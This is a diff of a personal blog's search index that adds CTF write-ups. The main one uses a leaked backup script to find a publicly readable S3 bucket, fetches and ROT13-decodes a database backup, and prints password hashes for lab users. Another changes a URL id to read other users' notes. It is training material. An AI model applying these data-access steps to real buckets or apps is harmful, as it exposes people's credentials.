/tmp/&#123;BACKUP_FILENAME&#125;&quot;)</span><br><span class="line">-    ssh.close()</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-if __name__ == &quot;__main__&quot;:</span><br><span class="line">-    download_from_s3()</span><br><span class="line">-    decode()</span><br><span class="line">-    print(&quot;[+] Backup decoded.&quot;)</span><br><span class="line">-    restore_backup()</span><br><span class="line">-    print(&quot;[+] DB restored.&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>and yes, one of them is <code>backup_db.py</code></p>
+<ol start="3">
+<li>Using the results of your analysis, discover the public address of the database leak. Verify the contents of the leak by submitting the password hash for Naomi Adler.</li>
+</ol>
+<ul>
+<li>pbkdf2:sha256:600000$YQqIvcDipYLzzXPB$598fe450e5ac019cdd41b4b10c5c21515573ee63a8f4881f7d721fd74ee43d59</li>
+</ul>
+<p><strong>Solving Method:</strong></p>
+<p>From the backup_db.py file we discovered in question 2, I found crucial information about where backups are stored:</p>
+<ul>
+<li>S3 Bucket: <code>protoguard-asset-management</code></li>
+<li>S3 Key: <code>db_backup.xyz</code></li>
+<li>S3 Region: <code>us-east-2</code></li>
+<li>Encoding: ROT13</li>
+</ul>
+<p>First, I attempted to download the backup file from the S3 bucket using the information found:</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> https://protoguard<span class="literal">-asset-management</span>.s3.us<span class="literal">-east-2</span>.amazonaws.com/db_backup.xyz <span class="literal">-o</span> <span class="string">&quot;<span class="variable">$env:TEMP</span>\db_backup.xyz&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The file downloaded successfully, which means the S3 bucket is publicly accessible — this is a major security vulnerability!</p>
+<p>Next, I needed to decode the backup file since it was encoded with ROT13. I used PowerShell to decode it:</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$encodedContent</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;<span class="variable">$env:TEMP</span>\db_backup.xyz&quot;</span> <span class="literal">-Raw</span></span><br><span class="line"><span class="variable">$decodedContent</span> = <span class="operator">-join</span> (<span class="variable">$encodedContent</span>.ToCharArray() | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&#x27;[a-zA-Z]&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="keyword">if</span> (<span class="variable">$_</span> <span class="operator">-cle</span> <span class="string">&#x27;Z&#x27;</span>) &#123; [<span class="built_in">int</span>][<span class="built_in">char</span>]<span class="string">&#x27;A&#x27;</span> &#125; <span class="keyword">else</span> &#123; [<span class="built_in">int</span>][<span class="built_in">char</span>]<span class="string">&#x27;a&#x27;</span> &#125;</span><br><span class="line">        [<span class="built_in">char</span>](<span class="variable">$base</span> + (([<span class="built_in">int</span>]<span class="variable">$_</span> - <span class="variable">$base</span> + <span class="number">13</span>) % <span class="number">26</span>))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="variable">$_</span> &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable">$decodedContent</span> | <span class="built_in">Out-File</span> <span class="string">&quot;<span class="variable">$env:TEMP</span>\db_decoded.sql&quot;</span> <span class="literal">-Encoding</span> utf8</span><br></pre></td></tr></table></figure></div>
+
+<p>After decoding, I searched for Naomi Adler’s password hash:</p>
+<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> <span class="string">&quot;<span class="variable">$env:TEMP</span>\db_decoded.sql&quot;</span> | <span class="built_in">Select-String</span> <span class="literal">-Pattern</span> <span class="string">&quot;Naomi&quot;</span> <span class="literal">-Context</span> <span class="number">0</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Output:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; 11    Naomi   Adler   Cognitive Systems Research      naomi.adler</span><br><span class="line">pbkdf2:sha256:600000$YQqIvcDipYLzzXPB$598fe450e5ac019cdd41b4b10c5c21515573ee63a8f4881f7d721fd74ee43d59</span><br><span class="line">  12    Thomas  Sinclair        Technical Documentation &amp; Records       thomas.sinclair</span><br><span class="line">pbkdf2:sha256:600000$jiHdWOQtTkpCxgNR$96eca6d861e91a79f3941c42000ef8eca3c28aeece8fb7a97cbc9e687ecf5afc</span><br><span class="line">  13    Leila   Haddad  Chemical Catalysis Research     leila.haddad</span><br><span class="line">pbkdf2:sha256:600000$6DDYtk7r2O18ELlz$c21419b605e4aa73169634144843115b44104621ee2c6f22bbad427b806c8c28</span><br><span class="line">  14    Gabriel Montoya Drone Systems Development       gabriel.montoya</span><br><span class="line">pbkdf2:sha256:600000$Ko7CFWeuJ5aUTTOt$4641aeb53f381592e7040f93116a8c4675ae44f916fa44b3be61fc02ae39e0fa</span><br></pre></td></tr></table></figure></div>
+
+<p>Successfully retrieved Naomi Adler’s password hash!</p>
+<ol start="4">
+<li>Submit the public address of the database leak, including the name of the file.</li>
+</ol>
+<ul>
+<li><a class="link"   href="https://protoguard-asset-management.s3.us-east-2.amazonaws.com/db_backup.xyz" >https://protoguard-asset-management.s3.us-east-2.amazonaws.com/db_backup.xyz<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<p><strong>Solving Method:</strong></p>
+<p>Based on the information extracted from the backup_db.py script in question 2, I constructed the public S3 URL using the following details:</p>
+<ul>
+<li><strong>S3_BUCKET:</strong> <code>protoguard-asset-management</code></li>
+<li><strong>S3_KEY:</strong> <code>db_backup.xyz</code></li>
+<li><strong>S3_REGION:</strong> <code>us-east-2</code></li>
+</ul>
+<p>The standard format for publicly accessible S3 URLs is:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://&#123;bucket-name&#125;.s3.&#123;region&#125;.amazonaws.com/&#123;object-key&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Therefore, the complete public address is:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://protoguard-asset-management.s3.us-east-2.amazonaws.com/db_backup.xyz</span><br></pre></td></tr></table></figure></div>
+
+<p>This URL was verified to be publicly accessible when I successfully downloaded the file in question 3. The fact that this sensitive database backup is publicly accessible without authentication is a critical security flaw that led to the data leak.</p>
+<p><strong>Key Security Issues Identified:</strong></p>
+<ol>
+<li>Database backup script was committed to Git history (even after deletion)</li>
+<li>S3 bucket has public read access enabled</li>
+<li>Sensitive database backup is stored in a publicly accessible location</li>
+<li>The ROT13 encoding provides no real security (easily reversible)</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Offsec</tag>
+        <tag>Learning</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Readme</title>
+    <url>/2024/12/31/Readme/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>This is my First Post in my Website!!<br>There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Try Hack Me Hackinfinity Battle CTF 2025</title>
+    <url>/2025/03/19/Try-Hack-Me-Hackinfinity-Battle-CTF-2025/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NotePad-Online"><a href="#NotePad-Online" class="headerlink" title="NotePad Online"></a>NotePad Online</h2><ol>
+<li>First, start the machine and sign in to the ip address and email+password given.</li>
+<li>Have a look in the url, we can see the url have id&#x3D;1.</li>
+<li>Lets have a try to increase the number and we can found that it do can be increase and changing different data shown.</li>
+<li>After arrive id&#x3D;7, it show that we can decrease the number 1 so change it to 0</li>
+<li>Tada! The flag is there <code>THM&#123;i_can_see_your_notes&#125;</code></li>
+</ol>
+<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="Catch-Me-If-You-Can"><a href="#Catch-Me-If-You-Can" class="headerlink" title="Catch Me If You Can"></a>Catch Me If You Can</h2><ol>
+<li>According to the Image given, It show a building with a some arts.</li>
+<li>after image search on google, we found that it is at brazil, beco do batman.</li>
+<li>Google search beco do batman burger restaurant shows some restaurant name but first is coringa do beco.</li>
+<li>Flag &#x3D; THM{coringa_do_beco}</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>UM CyberSummit 2025</title>
+    <url>/2025/04/18/UM-CyberSummit-2025/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="🔗-Check-Out-Our-Website"><a href="#🔗-Check-Out-Our-Website" class="headerlink" title="🔗 Check Out Our Website"></a>🔗 Check Out Our Website</h1><p>👉 <a class="link"   href="https://cyberxutm.github.io/blog/umcsctf-24/" >UMCS CTF Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<hr>
+<h2 id="📄-CTF-Preliminary-Round-Writeup"><a href="#📄-CTF-Preliminary-Round-Writeup" class="headerlink" title="📄 CTF Preliminary Round Writeup"></a>📄 CTF Preliminary Round Writeup</h2><iframe src="/files/UMCS CTF Preliminary Round Writeups.pdf" width="100%" height="600px" style="border: none;">
+    This browser does not support PDF viewing. You can <a href="/files/UMCS CTF Preliminary Round Writeups.pdf">download the writeup here</a>.
+</iframe>
+
+<hr>
+<h2 id="✍️-Writeup-Credits"><a href="#✍️-Writeup-Credits" class="headerlink" title="✍️ Writeup Credits"></a>✍️ Writeup Credits</h2><p>This writeup is compiled by <strong>@gr1d</strong><br>Written by <strong>@tony</strong>, <strong>@gr1d</strong>, <strong>@bakayang</strong>, and <strong>@me</strong><br>🛡️ Team: <strong>bWrg3r x UTM</strong></p>
+]]></content>
+      <tags>
+        <tag>CTF 2025</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/404.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
+  </entry>
+  <entry>
+    <title>Categories</title>
+    <url>/categories/index.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
   </entry>
   <entry>
@@ -1766,38 +2015,14 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Categories</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/css/custom-preloader.css</url>
-    <content><![CDATA[.preloader{background-color:#0f172a!important;background-image:linear-gradient(135deg,rgba(15,23,42,.97) 0,rgba(30,41,59,.97) 100%),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%234b5563' fill-opacity='0.1' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E")!important;transition:opacity .3s ease-out,visibility .3s ease-out!important;box-shadow:inset 0 0 100px rgba(0,0,0,.3)}.ml13{font-size:2.2rem!important;font-weight:300!important;letter-spacing:.08em;line-height:1.4;color:rgba(226,232,240,.95)!important;text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3);margin-bottom:1.5rem;max-width:85%}.letter{display:inline-block;opacity:0;transform:translateX(-.2em);filter:blur(4px);animation:fadeInFromLeft .4s forwards;animation-delay:calc(var(--index) * .03s);color:rgba(226,232,240,.95);text-shadow:0 0 10px rgba(148,163,184,.4)}@keyframes fadeInFromLeft{0%{opacity:0;transform:translateX(-.3em);filter:blur(6px)}60%{opacity:.8;transform:translateX(0);filter:blur(2px);color:rgba(248,250,252,.98);text-shadow:0 0 8px rgba(186,230,253,.7)}100%{opacity:1;transform:translateX(0);filter:blur(0);color:rgba(226,232,240,.95);text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3)}}@media (max-width:768px){.ml13{font-size:1.8rem!important;margin-bottom:0}}]]></content>
-  </entry>
-  <entry>
-    <title>My Friends &amp; Teammates</title>
-    <url>/links/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
     <title></title>
     <url>/css/back-to-top.css</url>
     <content><![CDATA[.back-to-top-btn{position:fixed;bottom:20px;right:20px;width:50px;height:50px;border:none;border-radius:50%;background:linear-gradient(135deg,#0ea5e9,#3b82f6);color:#fff;font-size:20px;font-weight:700;cursor:pointer;opacity:0;visibility:hidden;transition:all .3s ease;z-index:1000;box-shadow:0 4px 12px rgba(14,165,233,.3)}.back-to-top-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(14,165,233,.4);background:linear-gradient(135deg,#0284c7,#2563eb)}.back-to-top-btn.show{opacity:1;visibility:visible}.back-to-top-btn:active{transform:translateY(0)}@media (prefers-color-scheme:dark){.back-to-top-btn{background:linear-gradient(135deg,#1e40af,#7c3aed);box-shadow:0 4px 12px rgba(30,64,175,.3)}.back-to-top-btn:hover{background:linear-gradient(135deg,#1d4ed8,#8b5cf6);box-shadow:0 6px 20px rgba(30,64,175,.4)}}@media (max-width:768px){.back-to-top-btn{width:45px;height:45px;bottom:15px;right:15px;font-size:18px}}]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>/js/reading-progress.js</url>
-    <content><![CDATA[(()=>{let i=document.createElement("div");function e(){var e="/"===window.location.pathname||"/index.html"===window.location.pathname,n=document.documentElement.scrollHeight,t=window.innerHeight;i.style.display=e||n<=1.2*t?"none":"block"}i.className="reading-progress-bar",i.style.cssText=`
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 0%;
-    height: 3px;
-    background: linear-gradient(90deg, #0ea5e9, #3b82f6);
-    z-index: 9999;
-    transition: width 0.1s ease;
-  `,document.body.appendChild(i),window.addEventListener("scroll",function(){var e=window.innerHeight,e=document.documentElement.scrollHeight-e,e=window.pageYOffset/e*100;i.style.width=Math.min(e,100)+"%"}),window.addEventListener("load",e),window.addEventListener("resize",e),e()})();]]></content>
+    <url>/css/custom-styles.css</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1827,23 +2052,27 @@
   </entry>
   <entry>
     <title></title>
+    <url>/css/custom-preloader.css</url>
+    <content><![CDATA[.preloader{background-color:#0f172a!important;background-image:linear-gradient(135deg,rgba(15,23,42,.97) 0,rgba(30,41,59,.97) 100%),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%234b5563' fill-opacity='0.1' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E")!important;transition:opacity .3s ease-out,visibility .3s ease-out!important;box-shadow:inset 0 0 100px rgba(0,0,0,.3)}.ml13{font-size:2.2rem!important;font-weight:300!important;letter-spacing:.08em;line-height:1.4;color:rgba(226,232,240,.95)!important;text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3);margin-bottom:1.5rem;max-width:85%}.letter{display:inline-block;opacity:0;transform:translateX(-.2em);filter:blur(4px);animation:fadeInFromLeft .4s forwards;animation-delay:calc(var(--index) * .03s);color:rgba(226,232,240,.95);text-shadow:0 0 10px rgba(148,163,184,.4)}@keyframes fadeInFromLeft{0%{opacity:0;transform:translateX(-.3em);filter:blur(6px)}60%{opacity:.8;transform:translateX(0);filter:blur(2px);color:rgba(248,250,252,.98);text-shadow:0 0 8px rgba(186,230,253,.7)}100%{opacity:1;transform:translateX(0);filter:blur(0);color:rgba(226,232,240,.95);text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3)}}@media (max-width:768px){.ml13{font-size:1.8rem!important;margin-bottom:0}}]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/css/social-share.css</url>
     <content><![CDATA[.social-share{display:flex;gap:.5rem;margin:1rem 0;flex-wrap:wrap}.social-share-btn{display:inline-flex;align-items:center;justify-content:center;padding:.5rem 1rem;border:none;border-radius:.375rem;font-size:.875rem;font-weight:500;text-decoration:none;color:#fff;cursor:pointer;transition:all .2s ease;min-width:2.5rem;height:2.5rem}.social-share-btn:hover{transform:translateY(-1px);box-shadow:0 4px 8px rgba(0,0,0,.2)}.social-share-btn.twitter{background-color:#1da1f2}.social-share-btn.facebook{background-color:#1877f2}.social-share-btn.linkedin{background-color:#0a66c2}.social-share-btn.telegram{background-color:#08c}.social-share-btn.copy{background-color:#6b7280}.social-share-btn:hover.twitter{background-color:#0c8de4}.social-share-btn:hover.facebook{background-color:#166fe5}.social-share-btn:hover.linkedin{background-color:#004182}.social-share-btn:hover.telegram{background-color:#0077b5}.social-share-btn:hover.copy{background-color:#4b5563}@media (max-width:768px){.social-share{justify-content:center}.social-share-btn{flex:1;min-width:0;max-width:3rem}}]]></content>
   </entry>
   <entry>
-    <title>Projects</title>
-    <url>/projects/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>Welcome to my project collection 🚀<br>Here you’ll find my public tools, writeups, experiments, and apps.</p>
-<h3 id="Featured-Projects"><a href="#Featured-Projects" class="headerlink" title="Featured Projects"></a>Featured Projects</h3><h4 id="🔐-Spok-io-AI-Public-Speaking-Coach"><a href="#🔐-Spok-io-AI-Public-Speaking-Coach" class="headerlink" title="🔐 Spok.io - AI Public Speaking Coach"></a>🔐 Spok.io - AI Public Speaking Coach</h4><p>An AI platform for practicing public speaking with camera + pose + speech feedback.<br><a class="link"   href="https://github.com/YaoHack-KitaHack-2025/YaoHack---KitaHack-2025" >View Demo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<hr>
-<h4 id="🔍-AI-Stock-Detection-System"><a href="#🔍-AI-Stock-Detection-System" class="headerlink" title="🔍 AI Stock Detection System"></a>🔍 AI Stock Detection System</h4><p>ESP32-CAM and object detection to manage inventory with SQL dashboard.<br>This is a internship project for me to participate in Airost Club So~~~ Feel free to inform me if any need to be updated.<br><a class="link"   href="https://github.com/Airost-Project/Airost-Intership-Project" >Read More<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<hr>
-<h4 id="CTF-Discord-Bots"><a href="#CTF-Discord-Bots" class="headerlink" title="CTF Discord Bots"></a>CTF Discord Bots</h4><p>This is the repo of CTF bots that run inside discord server. Feel free to use them in your CTF server.(change the token,whitelist in the code before running)<br><a class="link"   href="https://github.com/bwrg3r/discordbots" >CTF Discord Bot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Others-On-Going"><a href="#Others-On-Going" class="headerlink" title="Others (On Going)"></a>Others (On Going)</h3><ul>
-<li><a href="Waiting">CTF Platform Setup Guide</a></li>
-<li><a href="Waiting">Secure Web Login System</a></li>
-</ul>
-]]></content>
+    <title></title>
+    <url>/js/reading-progress.js</url>
+    <content><![CDATA[(()=>{let i=document.createElement("div");function e(){var e="/"===window.location.pathname||"/index.html"===window.location.pathname,n=document.documentElement.scrollHeight,t=window.innerHeight;i.style.display=e||n<=1.2*t?"none":"block"}i.className="reading-progress-bar",i.style.cssText=`
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 0%;
+    height: 3px;
+    background: linear-gradient(90deg, #0ea5e9, #3b82f6);
+    z-index: 9999;
+    transition: width 0.1s ease;
+  `,document.body.appendChild(i),window.addEventListener("scroll",function(){var e=window.innerHeight,e=document.documentElement.scrollHeight-e,e=window.pageYOffset/e*100;i.style.width=Math.min(e,100)+"%"}),window.addEventListener("load",e),window.addEventListener("resize",e),e()})();]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1863,18 +2092,33 @@
     `,document.body.appendChild(t),setTimeout(()=>t.style.opacity="1",10),setTimeout(()=>{t.style.opacity="0",setTimeout(()=>document.body.removeChild(t),300)},2e3)}document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll("[data-share]").forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var e=this.getAttribute("data-share"),t={url:window.location.href,title:document.title,description:document.querySelector('meta[name="description"]')?.content||"",image:document.querySelector('meta[property="og:image"]')?.content||""};o[e]&&o[e](t)})})})})();]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/js/analytics/performance.js</url>
-    <content><![CDATA[(()=>{if(window.addEventListener("load",function(){setTimeout(function(){if(performance&&performance.timing){var o=performance.timing,e=o.loadEventEnd-o.navigationStart,n=o.domainLookupEnd-o.domainLookupStart,t=o.connectEnd-o.connectStart,a=o.responseStart-o.requestStart,o=o.domComplete-o.domLoading;if("localhost"!==window.location.hostname&&"127.0.0.1"!==window.location.hostname||(console.log("Performance Metrics:"),console.log("- Page load time: "+e+"ms"),console.log("- DNS lookup time: "+n+"ms"),console.log("- TCP connection time: "+t+"ms"),console.log("- Time to first byte: "+a+"ms"),console.log("- DOM processing time: "+o+"ms")),"undefined"!=typeof web_vitals&&web_vitals)try{web_vitals.getCLS&&web_vitals.getCLS(function(o){console.log("CLS:",o.value)}),web_vitals.getFID&&web_vitals.getFID(function(o){console.log("FID:",o.value)}),web_vitals.getLCP&&web_vitals.getLCP(function(o){console.log("LCP:",o.value)})}catch(o){console.warn("Error collecting Web Vitals:",o)}performance.memory&&(e=performance.memory,console.log("Memory usage:"),console.log("- Used: "+Math.round(e.usedJSHeapSize/1048576)+"MB"),console.log("- Total: "+Math.round(e.totalJSHeapSize/1048576)+"MB"),console.log("- Limit: "+Math.round(e.jsHeapSizeLimit/1048576)+"MB"))}else console.warn("Performance API not available")},100)}),"PerformanceObserver"in window)try{new PerformanceObserver(function(o){o.getEntries().forEach(function(o){50<o.duration&&console.warn("Long task detected:",o.duration+"ms",o)})}).observe({entryTypes:["longtask"]})}catch(o){console.warn("Performance observer not supported:",o)}})();]]></content>
+    <title>My Friends &amp; Teammates</title>
+    <url>/links/index.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/css/custom-styles.css</url>
-    <content><![CDATA[]]></content>
+    <title>Projects</title>
+    <url>/projects/index.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>Welcome to my project collection 🚀<br>Here you’ll find my public tools, writeups, experiments, and apps.</p>
+<h3 id="Featured-Projects"><a href="#Featured-Projects" class="headerlink" title="Featured Projects"></a>Featured Projects</h3><h4 id="🔐-Spok-io-AI-Public-Speaking-Coach"><a href="#🔐-Spok-io-AI-Public-Speaking-Coach" class="headerlink" title="🔐 Spok.io - AI Public Speaking Coach"></a>🔐 Spok.io - AI Public Speaking Coach</h4><p>An AI platform for practicing public speaking with camera + pose + speech feedback.<br><a class="link"   href="https://github.com/YaoHack-KitaHack-2025/YaoHack---KitaHack-2025" >View Demo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<hr>
+<h4 id="🔍-AI-Stock-Detection-System"><a href="#🔍-AI-Stock-Detection-System" class="headerlink" title="🔍 AI Stock Detection System"></a>🔍 AI Stock Detection System</h4><p>ESP32-CAM and object detection to manage inventory with SQL dashboard.<br>This is a internship project for me to participate in Airost Club So~~~ Feel free to inform me if any need to be updated.<br><a class="link"   href="https://github.com/Airost-Project/Airost-Intership-Project" >Read More<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<hr>
+<h4 id="CTF-Discord-Bots"><a href="#CTF-Discord-Bots" class="headerlink" title="CTF Discord Bots"></a>CTF Discord Bots</h4><p>This is the repo of CTF bots that run inside discord server. Feel free to use them in your CTF server.(change the token,whitelist in the code before running)<br><a class="link"   href="https://github.com/bwrg3r/discordbots" >CTF Discord Bot<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Others-On-Going"><a href="#Others-On-Going" class="headerlink" title="Others (On Going)"></a>Others (On Going)</h3><ul>
+<li><a href="Waiting">CTF Platform Setup Guide</a></li>
+<li><a href="Waiting">Secure Web Login System</a></li>
+</ul>
+]]></content>
   </entry>
   <entry>
     <title>Tags</title>
     <url>/tags/index.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/js/analytics/performance.js</url>
+    <content><![CDATA[(()=>{if(window.addEventListener("load",function(){setTimeout(function(){if(performance&&performance.timing){var o=performance.timing,e=o.loadEventEnd-o.navigationStart,n=o.domainLookupEnd-o.domainLookupStart,t=o.connectEnd-o.connectStart,a=o.responseStart-o.requestStart,o=o.domComplete-o.domLoading;if("localhost"!==window.location.hostname&&"127.0.0.1"!==window.location.hostname||(console.log("Performance Metrics:"),console.log("- Page load time: "+e+"ms"),console.log("- DNS lookup time: "+n+"ms"),console.log("- TCP connection time: "+t+"ms"),console.log("- Time to first byte: "+a+"ms"),console.log("- DOM processing time: "+o+"ms")),"undefined"!=typeof web_vitals&&web_vitals)try{web_vitals.getCLS&&web_vitals.getCLS(function(o){console.log("CLS:",o.value)}),web_vitals.getFID&&web_vitals.getFID(function(o){console.log("FID:",o.value)}),web_vitals.getLCP&&web_vitals.getLCP(function(o){console.log("LCP:",o.value)})}catch(o){console.warn("Error collecting Web Vitals:",o)}performance.memory&&(e=performance.memory,console.log("Memory usage:"),console.log("- Used: "+Math.round(e.usedJSHeapSize/1048576)+"MB"),console.log("- Total: "+Math.round(e.totalJSHeapSize/1048576)+"MB"),console.log("- Limit: "+Math.round(e.jsHeapSizeLimit/1048576)+"MB"))}else console.warn("Performance API not available")},100)}),"PerformanceObserver"in window)try{new PerformanceObserver(function(o){o.getEntries().forEach(function(o){50<o.duration&&console.warn("Long task detected:",o.duration+"ms",o)})}).observe({entryTypes:["longtask"]})}catch(o){console.warn("Performance observer not supported:",o)}})();]]></content>
   </entry>
 </search>
